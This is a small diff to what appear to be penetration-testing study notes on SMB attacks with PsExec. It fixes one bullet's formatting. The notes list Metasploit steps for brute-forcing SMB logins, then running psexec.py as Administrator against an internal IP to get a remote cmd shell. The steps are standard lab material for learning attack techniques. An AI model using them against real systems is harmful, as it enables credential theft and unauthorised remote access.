@@ -23,7 +23,7 @@ SMB with PsExec
 - msfconsole
 - search smb_login
 - set all parameters requires [this will retrive users and password]
--psexec.py Adminitrator@10.2.24.221 cmd.exe [ here we need cmd shell that's why we use cmd.exe]
+- psexec.py Adminitrator@10.2.24.221 cmd.exe [ here we need cmd shell that's why we use cmd.exe]
 - this will give us cmd prompt
 #### msf module
 - search psexec
